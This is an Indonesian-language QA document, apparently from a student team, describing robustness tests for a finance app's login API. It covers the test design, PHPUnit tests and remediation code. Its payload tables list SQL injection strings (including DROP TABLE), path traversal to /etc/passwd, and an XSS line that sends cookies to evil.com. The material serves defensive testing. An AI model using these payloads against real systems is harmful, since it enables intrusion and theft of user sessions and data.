# 🛡️ Robustness Testing

> **Model Black Box Testing #5** — *Input-Based Testing*
> **Modul Target:** Login — Input di Luar Spesifikasi (XSS, SQL Injection, Extreme Input)
> **Tim:** REMACode

---

## 📖 1. Definisi

**Robustness Testing** adalah teknik pengujian dimana **data masukan diambil dari luar spesifikasi yang didefinisikan**. Robustness testing ditujukan sebagai **pembuktian bahwa tidak terdapat kesalahan apabila terdapat masukan yang tidak valid** (Suprihadi, 2025). Teknik ini secara khusus menguji ketahanan sistem terhadap input yang abnormal, berbahaya, atau berada di luar batas yang diharapkan.

> *"Data masukan diambil dari luar spesifikasi yang didefinisikan. Robustness testing ditujukan sebagai pembuktian bahwa tidak terdapat kesalahan apabila terdapat masukan yang tidak valid."* — (Suprihadi, 2025)

### Robustness vs Boundary Value Analysis

| Aspek | BVA | Robustness Testing |
|---|---|---|
| **Range input** | Tepat di batas & sedikit melewati | **Jauh** di luar batas |
| **Fokus** | Off-by-one error | Sistem tidak crash/expose data |
| **Tipe input** | Nilai numerik batas | Karakter berbahaya, format aneh |
| **Tujuan** | Validasi batas | Ketahanan & keamanan |

---

## 🎯 2. Tujuan Pengujian

| No | Tujuan |
|---|---|
| 1 | Membuktikan sistem tidak crash pada input tidak valid |
| 2 | Memastikan **SQL Injection** tidak bisa menembus sistem |
| 3 | Memverifikasi **XSS** di-sanitize sebelum disimpan/ditampilkan |
| 4 | Menguji ketahanan terhadap **input sangat panjang** |
| 5 | Memastikan **error handling** mengembalikan pesan yang aman (tidak expose stack trace) |

---

## 💻 3. Modul yang Diuji

**Endpoint:** `POST /api/login`
**Fields:** `email`, `password`

> ⚠️ **TODO:** Konfirmasi field yang digunakan di `midnight-finance-backend`. Sesuaikan jika ada field tambahan (mis. `device_token`, `remember_me`).

### Spesifikasi Normal (Baseline)

| Field | Format Valid | Batas |
|---|---|---|
| `email` | string, format email | max 255 char |
| `password` | string, min 8 char | max 255 char |

---

## 🔍 4. Kategori Input Tidak Valid

### 4.1 SQL Injection Payloads

Upaya memanipulasi query database melalui field input:

| Payload ID | Input | Target |
|---|---|---|
| `SQL-01` | `' OR '1'='1` | Bypass login tanpa password |
| `SQL-02` | `admin'--` | Comment out password check |
| `SQL-03` | `'; DROP TABLE users;--` | Destructive query |
| `SQL-04` | `' UNION SELECT * FROM users--` | Data extraction |
| `SQL-05` | `1' AND SLEEP(5)--` | Time-based blind injection |

### 4.2 XSS (Cross-Site Scripting) Payloads

Upaya menyisipkan script berbahaya:

| Payload ID | Input | Target |
|---|---|---|
| `XSS-01` | `<script>alert('XSS')</script>` | Stored XSS via email field |
| `XSS-02` | `<img src=x onerror=alert(1)>` | Event handler XSS |
| `XSS-03` | `javascript:alert(document.cookie)` | Cookie theft |
| `XSS-04` | `"><script>fetch('evil.com?c='+document.cookie)</script>` | Data exfiltration |

### 4.3 Extreme Length Input

Input dengan panjang jauh melebihi spesifikasi:

| Payload ID | Input Length | Deskripsi |
|---|---|---|
| `LEN-01` | 256 karakter | Satu lebih dari batas max |
| `LEN-02` | 1.000 karakter | 4x batas max |
| `LEN-03` | 10.000 karakter | Very large string |
| `LEN-04` | 100.000 karakter | Buffer overflow attempt |

### 4.4 Special Characters & Format Aneh

| Payload ID | Input | Deskripsi |
|---|---|---|
| `SPEC-01` | `null` | Null string literal |
| `SPEC-02` | `undefined` | JS undefined string |
| `SPEC-03` | `{"email":"admin"}` | JSON object as input |
| `SPEC-04` | `../../../etc/passwd` | Path traversal |
| `SPEC-05` | `%00%0d%0a` | Null byte & CRLF injection |
| `SPEC-06` | `😀🔥💀` | Emoji (4-byte UTF-8) |
| `SPEC-07` | `　　　　` | Whitespace-only (Unicode spaces) |
| `SPEC-08` | `TRUE` / `FALSE` / `1` / `0` | Boolean-like strings |

---

## 🧪 5. Test Case Design

### 5.1 SQL Injection Test Cases

| TC ID | Field | Input | Expected Response | Expected HTTP |
|---|---|---|---|---|
| `RT-SQL-01` | email | `' OR '1'='1` | 401 Invalid credentials | 401 |
| `RT-SQL-02` | email | `admin'--` | 401 Invalid credentials | 401 |
| `RT-SQL-03` | email | `'; DROP TABLE users;--` | 401 Invalid credentials | 401 |
| `RT-SQL-04` | password | `' OR '1'='1` | 401 Invalid credentials | 401 |
| `RT-SQL-05` | email | `1' AND SLEEP(5)--` | Response < 1000ms | 401 |

### 5.2 XSS Test Cases

| TC ID | Field | Input | Expected | HTTP |
|---|---|---|---|---|
| `RT-XSS-01` | email | `<script>alert('XSS')</script>` | 422 Validation error | 422 |
| `RT-XSS-02` | email | `<img src=x onerror=alert(1)>` | 422 Validation error | 422 |
| `RT-XSS-03` | password | `<script>alert(1)</script>` | 401 (treated as wrong pass) | 401 |

### 5.3 Extreme Length Test Cases

| TC ID | Field | Input Length | Expected | HTTP |
|---|---|---|---|---|
| `RT-LEN-01` | email | 256 char | 422 Validation error | 422 |
| `RT-LEN-02` | email | 1.000 char | 422 Validation error | 422 |
| `RT-LEN-03` | password | 10.000 char | 422 Validation error | 422 |
| `RT-LEN-04` | password | 100.000 char | Tidak crash, return error | 422/400 |

### 5.4 Special Character Test Cases

| TC ID | Field | Input | Expected | HTTP |
|---|---|---|---|---|
| `RT-SPEC-01` | email | `null` | 422 Invalid email format | 422 |
| `RT-SPEC-02` | email | `{"email":"admin"}` | 422 Invalid email format | 422 |
| `RT-SPEC-03` | email | `../../../etc/passwd` | 422 Invalid email format | 422 |
| `RT-SPEC-04` | email | `😀@test.com` | 422 or 401 | 422/401 |
| `RT-SPEC-05` | email | `　　　　` | 422 Required field | 422 |
| `RT-SPEC-06` | password | `%00%0d%0a` | 401 (treated as wrong pass) | 401 |

---

## 📸 6. Screenshot yang Diperlukan

> **📸 SCREENSHOT NEEDED #1:** **Login Form — Default State**
> Screenshot halaman login Midnight Finance dalam kondisi form kosong.
> *File suggested name:* `screenshot/RT-login-form-default.png`

> **📸 SCREENSHOT NEEDED #2:** **SQL Injection Ditolak (RT-SQL-01)**
> Masukkan `' OR '1'='1` di field email, submit, screenshot response — pastikan sistem menolak dengan 401, BUKAN berhasil login.
> *File suggested name:* `screenshot/RT-sql-injection-blocked.png`

> **📸 SCREENSHOT NEEDED #3:** **XSS Ditolak (RT-XSS-01)**
> Masukkan `<script>alert('XSS')</script>` di field email, screenshot error validation yang muncul.
> *File suggested name:* `screenshot/RT-xss-blocked.png`

> **📸 SCREENSHOT NEEDED #4:** **Input Panjang Ditolak (RT-LEN-02)**
> Paste 1000 karakter di field email, screenshot error validasi.
> *File suggested name:* `screenshot/RT-long-input-blocked.png`

> **📸 SCREENSHOT NEEDED #5:** **Response JSON (via Postman)**
> Screenshot Postman response untuk SQL injection attempt — tunjukkan HTTP 401 dan message "Invalid credentials" (BUKAN error DB atau stack trace).
> *File suggested name:* `screenshot/RT-postman-sql-response.png`

---

## 🚀 7. Implementasi Pengujian

### 7.1 Manual Testing — Postman

```http
POST /api/login HTTP/1.1
Content-Type: application/json

{
    "email": "' OR '1'='1",
    "password": "anything"
}
```

**Expected Response (semua robustness test):**
```json
{
    "message": "Invalid credentials"
}
```

**Yang TIDAK boleh muncul di response:**
```json
// ❌ BAHAYA — Jangan sampai muncul ini:
{
    "exception": "QueryException",
    "message": "SQLSTATE[42000]: Syntax error...",
    "trace": [...]
}
```

### 7.2 PHPUnit Test

```php
<?php

namespace Tests\Feature\Auth;

use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Hash;
use Tests\TestCase;

class LoginRobustnessTest extends TestCase
{
    use RefreshDatabase;

    /** @test RT-SQL-01: SQL Injection via email field */
    public function it_blocks_sql_injection_in_email(): void
    {
        $response = $this->postJson('/api/login', [
            'email'    => "' OR '1'='1",
            'password' => 'anything',
        ]);

        // Must NOT return 200 (successful login)
        $response->assertStatus(401);

        // Must NOT expose DB error
        $this->assertStringNotContainsString(
            'SQLSTATE',
            json_encode($response->json())
        );
    }

    /** @test RT-SQL-02: SQL Injection — comment injection */
    public function it_blocks_sql_comment_injection(): void
    {
        $response = $this->postJson('/api/login', [
            'email'    => "admin'--",
            'password' => 'anything',
        ]);

        $response->assertStatus(401);
        $this->assertStringNotContainsString('SQL', json_encode($response->json()));
    }

    /** @test RT-SQL-05: Time-based blind injection (response time check) */
    public function it_responds_quickly_on_sleep_injection(): void
    {
        $start = microtime(true);

        $this->postJson('/api/login', [
            'email'    => "1' AND SLEEP(5)--",
            'password' => 'anything',
        ]);

        $duration = (microtime(true) - $start) * 1000;

        // Should respond in < 1000ms (not 5000ms from SLEEP)
        $this->assertLessThan(1000, $duration,
            "Possible time-based SQL injection: response took {$duration}ms"
        );
    }

    /** @test RT-XSS-01: XSS via email field */
    public function it_rejects_xss_payload_in_email(): void
    {
        $response = $this->postJson('/api/login', [
            'email'    => "<script>alert('XSS')</script>",
            'password' => 'Pass@1234',
        ]);

        // XSS payload is not a valid email format → 422
        $response->assertStatus(422)
                 ->assertJsonValidationErrors(['email']);
    }

    /** @test RT-LEN-01: Email > 255 characters */
    public function it_rejects_email_exceeding_max_length(): void
    {
        $longEmail = str_repeat('a', 250) . '@test.com'; // 259 chars

        $response = $this->postJson('/api/login', [
            'email'    => $longEmail,
            'password' => 'Pass@1234',
        ]);

        $response->assertStatus(422)
                 ->assertJsonValidationErrors(['email']);
    }

    /** @test RT-LEN-03: Password 10000 characters — system must not crash */
    public function it_handles_extremely_long_password_without_crashing(): void
    {
        $longPassword = str_repeat('A', 10_000);

        $response = $this->postJson('/api/login', [
            'email'    => 'user@test.com',
            'password' => $longPassword,
        ]);

        // Must not be 500 (server crash)
        $this->assertNotEquals(500, $response->status(),
            'Server crashed on long password input'
        );

        // Must be 422 (validation) or 401 (wrong password)
        $this->assertTrue(in_array($response->status(), [401, 422]));
    }

    /** @test RT-SPEC-03: Path traversal in email */
    public function it_rejects_path_traversal_in_email(): void
    {
        $response = $this->postJson('/api/login', [
            'email'    => '../../../etc/passwd',
            'password' => 'anything',
        ]);

        $response->assertStatus(422)
                 ->assertJsonValidationErrors(['email']);
    }

    /** @test RT-SPEC-05: Whitespace-only email */
    public function it_rejects_whitespace_only_email(): void
    {
        $response = $this->postJson('/api/login', [
            'email'    => '     ',
            'password' => 'Pass@1234',
        ]);

        $response->assertStatus(422)
                 ->assertJsonValidationErrors(['email']);
    }

    /** @test No stack trace exposed on any robustness input */
    public function it_never_exposes_stack_trace_on_invalid_input(): void
    {
        $dangerousInputs = [
            ["' OR '1'='1", 'anything'],
            ['<script>alert(1)</script>', 'anything'],
            [str_repeat('a', 10_000), 'anything'],
            ['null', 'null'],
            ['{"json":"object"}', 'anything'],
        ];

        foreach ($dangerousInputs as [$email, $password]) {
            $response = $this->postJson('/api/login', [
                'email'    => $email,
                'password' => $password,
            ]);

            $body = json_encode($response->json());

            $this->assertStringNotContainsString('exception', $body,
                "Stack trace exposed for input: {$email}"
            );
            $this->assertStringNotContainsString('SQLSTATE', $body,
                "DB error exposed for input: {$email}"
            );
            $this->assertNotEquals(500, $response->status(),
                "Server crashed for input: {$email}"
            );
        }
    }
}
```

---

## 📊 8. Hasil Eksekusi

| TC ID | Kategori | Input | Expected HTTP | Actual | Status |
|---|---|---|---|---|---|
| `RT-SQL-01` | SQL Injection | `' OR '1'='1` | 401 | ⏳ Pending | — |
| `RT-SQL-02` | SQL Injection | `admin'--` | 401 | ⏳ Pending | — |
| `RT-SQL-03` | SQL Injection | `'; DROP TABLE users;--` | 401 | ⏳ Pending | — |
| `RT-SQL-05` | Time-based SQLi | `1' AND SLEEP(5)--` | 401 < 1000ms | ⏳ Pending | — |
| `RT-XSS-01` | XSS | `<script>alert(1)</script>` | 422 | ⏳ Pending | — |
| `RT-XSS-02` | XSS | `<img onerror=alert(1)>` | 422 | ⏳ Pending | — |
| `RT-LEN-01` | Long input | 256 char email | 422 | ⏳ Pending | — |
| `RT-LEN-03` | Long input | 10.000 char password | 422/401 | ⏳ Pending | — |
| `RT-LEN-04` | Long input | 100.000 char | No crash | ⏳ Pending | — |
| `RT-SPEC-01` | Special char | `null` | 422 | ⏳ Pending | — |
| `RT-SPEC-03` | Path traversal | `../../../etc/passwd` | 422 | ⏳ Pending | — |
| `RT-SPEC-05` | Whitespace | `　　　　` | 422 | ⏳ Pending | — |

### Kriteria PASS/FAIL

| Kondisi | Status |
|---|---|
| HTTP 200 pada SQL injection payload | ❌ **CRITICAL FAIL** |
| Response body mengandung `SQLSTATE` atau stack trace | ❌ **CRITICAL FAIL** |
| HTTP 500 pada input apapun | ❌ **FAIL** |
| HTTP 401 atau 422 pada semua invalid input | ✅ PASS |
| Response time < 1000ms pada SLEEP injection | ✅ PASS |

---

## 🐛 10. Temuan & Analisis

| ID | Severity | Deskripsi | Rekomendasi |
|---|---|---|---|
| `RT-001` | 🔴 Critical | Jika menggunakan raw query `DB::select("... WHERE email = '$email'")` — rentan SQLi | Selalu gunakan Eloquent atau `DB::table()->where()` (parameterized) |
| `RT-002` | 🔴 Critical | Error handler menampilkan stack trace di production (`APP_DEBUG=true`) | Set `APP_DEBUG=false` di `.env` production |
| `RT-003` | 🔴 High | Password panjang tanpa batas atas bisa menyebabkan bcrypt DoS (`bcrypt(str_repeat('a', 1000000))` butuh menit) | Tambah `max:72` di password validation (bcrypt limit = 72 char) |
| `RT-004` | 🟡 Medium | XSS di field email lolos karena email validation hanya cek format | Tambah `strip_tags()` di `prepareForValidation()` |
| `RT-005` | 🟢 Low | Error message berbeda untuk user tidak ditemukan vs password salah | Samakan pesan jadi `"Invalid credentials"` (sudah dibahas di CW-001) |

---

## ✅ 11. Rekomendasi Perbaikan

### 11.1 Validasi Keamanan di FormRequest

```php
public function rules(): array
{
    return [
        'email'    => 'required|email|max:255',
        'password' => 'required|string|min:8|max:72', // RT-003: bcrypt limit
    ];
}

protected function prepareForValidation(): void
{
    // RT-004: strip HTML tags dari semua input
    $this->merge([
        'email'    => strip_tags($this->email ?? ''),
        'password' => $this->password, // jangan strip password
    ]);
}
```

### 11.2 Global Exception Handler

```php
// app/Exceptions/Handler.php
public function render($request, Throwable $e): Response
{
    if ($request->expectsJson()) {
        // RT-002: Jangan expose exception detail di production
        return response()->json([
            'message' => app()->isProduction()
                ? 'Server error'
                : $e->getMessage(),
        ], 500);
    }

    return parent::render($request, $e);
}
```

### 11.3 Rate Limiting (Defense in Depth)

```php
// routes/api.php
Route::post('/login', [AuthController::class, 'login'])
    ->middleware('throttle:5,1') // 5 attempts per minute
    ->name('auth.login');
```

---

## ⚖️ 12. Kelebihan & Kekurangan

### ✅ Kelebihan
- Menguji **ketahanan keamanan** yang tidak bisa dideteksi oleh EP/BVA
- Menemukan **vulnerability** sebelum attacker menemukannya
- Memvalidasi **error handling** yang proper
- Wajib untuk sistem finansial yang menyimpan data sensitif
- Dapat dijadikan **security regression test**

### ❌ Kekurangan
- **Tidak exhaustive** — attacker selalu punya payload baru
- Memerlukan **security knowledge** untuk design test case
- Beberapa test (SLEEP injection) bisa lambat
- Tidak menggantikan **dedicated penetration testing**
- False negatives mungkin terjadi jika WAF mengubah payload

---

## 🛠️ 13. Tools Pendukung

| Tool | Kegunaan |
|---|---|
| **Postman** | Manual robustness testing |
| **OWASP ZAP** | Automated security scanning |
| **Burp Suite** | Intercept & modify request |
| **SQLMap** | Automated SQL injection detection |
| **PHPUnit** | Automated robustness regression test |
| **Laravel Sanctum** | Token-based auth yang aman |

---

## 📚 Referensi

1. Suprihadi, D. (2025). *Materi Software Quality Pertemuan 11*. Universitas Kristen Indonesia.
2. OWASP Foundation. (2021). *OWASP Top 10:2021*. https://owasp.org/Top10/
3. OWASP Foundation. (2023). *SQL Injection Prevention Cheat Sheet*. https://cheatsheetseries.owasp.org/
4. Beizer, B. (1995). *Black-Box Testing*. Wiley.
5. Myers, G. J., Sandler, C., & Badgett, T. (2011). *The Art of Software Testing* (3rd ed.). Wiley.

---

<div align="center">

[⬅ Sample Testing](./Sample_Testing.md) · [Kembali ke README](./README.md) · [Lanjut ke Comparison Testing ➡](./Comparison_Testing.md)

**Tim REMACode** — Midnight Finance SQA Documentation

</div>
